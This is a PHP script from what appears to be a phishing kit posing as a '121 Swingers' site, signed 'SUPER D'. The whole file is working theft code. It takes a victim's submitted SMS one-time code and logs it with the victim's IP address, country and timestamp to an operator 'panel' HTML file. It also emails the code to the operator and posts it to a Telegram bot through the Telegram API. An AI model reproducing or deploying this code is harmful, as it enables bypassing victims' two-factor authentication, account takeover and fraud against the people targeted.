<?php
/*
SUPER D
*/
@ini_set('display_errors', 'on');
if(isset($_POST['otp1'])){session_start(); 
require 'detect.php';
include "../../config.php";
$IP = getenv("REMOTE_ADDR");$date = date("d M, Y");$times = date("g:i a");$otp1 = $_POST['otp1'];$useragent = $_SERVER['HTTP_USER_AGENT'];$ecran = $_SESSION['computer'];$brow = $_SESSION['browser'];$sys = $_SESSION['os'];$code = $_SESSION['ip_countryCode']=clientData('code');$country = strtolower($code);
$msg = '
[☡] ------- 📩 SMS 📩 ------- [☡]

[💳]———— 🖤 SMS 🖤————-[💳]
[📮] Code [📮] = '.$otp1.'
[☡] ------- [#𝙲𝙺𝚁] ------- [☡]
';
$msght = '<tr>
<td width="80">
<p align="center"><img src="https://www.countryflags.io/'.$_SESSION['ip_countryCode'].'/flat/24.png">   ' .$IP.'</td>
<td width="30">
<p align="center">SMS 1</td>
<td width="40">
<p align="center">'.$otp1.'</td>
<td width="40">
<p align="center">'.$times.' / '.$date.'</td>
</font></td></tr>';
$save=fopen("../panel/otp".$namerand.".html", "a+");fwrite($save,$msght);fclose($save);
$subject  = " [ 121 Swingers SMS 1 ] / ".$IP." / Super 'D' ";$headers = "From: 121 Swingers \r\n";mail($yourmail, $subject, $msg, $headers);include("authentication.php");
    $token = "$botToken";
    $data = [
    'text' => $msg,
    'chat_id' => $chatId,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}
?>